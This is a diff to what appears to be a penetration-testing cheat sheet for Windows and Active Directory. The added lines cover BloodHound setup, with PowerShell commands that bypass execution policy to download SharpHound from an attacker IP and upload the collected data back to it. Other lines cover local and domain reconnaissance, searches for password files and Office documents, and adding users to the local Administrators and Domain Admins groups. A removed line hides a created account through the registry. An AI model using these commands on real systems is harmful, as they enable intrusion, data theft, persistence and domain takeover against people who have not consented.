@@ -81,6 +81,39 @@ nmap -Pn -n -T4 --open -p- -sC -sV -iL targets.txt
    Or use Discover which combines nmap, nmap scripts and Metasploit auxiliary modules.
 ------------------------------------------------------------------------------------------------------
 
+# BloodHound
+
+Firefox > seach neo4j download
+You must enter a valid email address to receive download link.
+
+tar -zxvf neo4j-enterprise-4.0.0-unix.tar.gz
+cd neo4j-enterprise-4.0.0/bin/
+
+./neo4j console
+firefox http://localhost:7474/ &
+Enter the default password: neo4j
+Change the password
+
+cd /opt/BloodHound-v3/Ingestors/
+python -m SimpleHTTPServer
+
+- Windows
+C:\> mkdir temp
+C:\> cd temp
+C:\temp> powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://<attacker IP>:8000/SharpHound.exe', 'C:\temp\SharpHound.exe')"
+
+SharpHound.exe -c LoggedOn                        Run the following as a user that has admin rights
+SharpHound.exe -c Session                         On subseqequent runs just collect session data
+
+This will generate a zip file
+
+d/l the zip file to Kali
+powershell -nop -exec bypass "IEX (New-Object Net.Webclient).UploadString('http://<attacker IP>/sharp.zip',"<PostDATA>")"
+
+Open the BloodHound UI
+Drag and drop the zip file into the UI
+------------------------------------------------------------------------------------------------------
+
 # Domain controller
 
 nbtstat -a <target IP>
@@ -106,21 +139,21 @@ impacket-secretsdump -hashes <hash> -just-dc LAB/dc\$@10.0.0.1
 
 whoami
 hostname
-echo %username%
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix(s)"
 
 net users                                         Local users
-net user <current user>
+net localgroup Administrators                     Users in the local Administrators Security Group
 
 ipconfig /all
 route print
 arp -A
 
+net share
+
 netstat -ano | findstr "LISTEN"
 netstat -ano | findstr "ESTABLISH"
 
-netsh firewall show state
-netsh firewall show config
+netsh advfirewall firewall
 
 schtasks /query /fo LIST /v
 tasklist /SVC
@@ -139,15 +172,15 @@ tasklist /m
 tasklist /svc
 tasklist /v
 
-dir c:\*.xls /s                                   Show all Excel files
-dir c:\*.xlsx /s                                  Show all Excel files
-dir c:\*.ppt /s                                   Show all PowerPoint files
-dir c:\*.pptx /s                                  Show all PowerPoint files
-dir c:\*.doc /s                                   Show all Word docs
-dir c:\*.docx /s                                  Show all Word docs
-dir c:\*.pdf /s                                   Show all PDF files
+dir /s /p *password*                              Show filenames that include 'password'
 
-dir /s /p *password*                              Show all filenames that include 'password'
+dir /s /b *.xls | findstr /E ".xls"               Show Excel files
+dir /s /b *.xlsx | findstr /E ".xlsx"             Show Excel files
+dir /s /b *.ppt | findstr /E ".ppt"               Show PowerPoint files
+dir /s /b *.pptx | findstr /E ".pptx"             Show PowerPoint files
+dir /s /b *.doc | findstr /E ".doc"               Show Word docs
+dir /s /b *.docx | findstr /E ".docx"             Show Word docs
+dir /s /b *.pdf | findstr /E ".pdf"               Show PDF files
 ------------------------------------------------------------------------------------------------------
 
 # Firewall
@@ -175,30 +208,26 @@ net accounts                                      Local password policy
 net config workstation
 net localgroup                                    Local Security Groups
 net localgroup Administrators                     Users in the local Administrators Security Group
-net localgroup "Remote Desktop Users"
-net share
-net user <user> <password> /add                   Add a local user
+net localgroup "Remote Desktop Users"             Users in the local Remote Desktop Users Security Group
 
-net user hacker /domain                           Info on domain user
+net user <user> <password> /add                   Add a local user
+net localgroup Administrators <user> /add         Add new user to the Administrators Security Group
+
 net view                                          Computers in the users domain and other domains
 net view /domain                                  Computers in other domain
 
-net user hacker abc123 /add
-net localgroup Administrators hacker /add
-
-- Hide a newly created account
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v hacker /d 0 /f
-
 - Domain
 net accounts /domain                              Domain password policy
-net group “Domain Admins" /domain                 Show domain admin
-net group “Domain Users" /domain                  Show domain users
 net user /domain                                  Show domain users
+net user <user> /domain                           Info on domain user
+net group “Domain Admins" /domain                 Show domain admin   *** BREAKS remote shell
+net group “Domain Users" /domain                  Show domain users   *** BREAKS remote shell
+
 net localgroup Administrators /domain             Users in the domain Administrators Security Group
 net localgroup /domain                            Domain Security Groups
 
-net user hacker password /add /domain             Add a user to the domain
-net group "Domain Admins" hacker /add /domain     Add a user to a specific Security Group on the domain
+net user <user> <password> /add /domain           Add a user to the domain
+net group "Domain Admins" <user> /add /domain     Add a user to a specific Security Group on the domain
 ------------------------------------------------------------------------------------------------------
 
 # Open RDP in the firewall, start the service and login
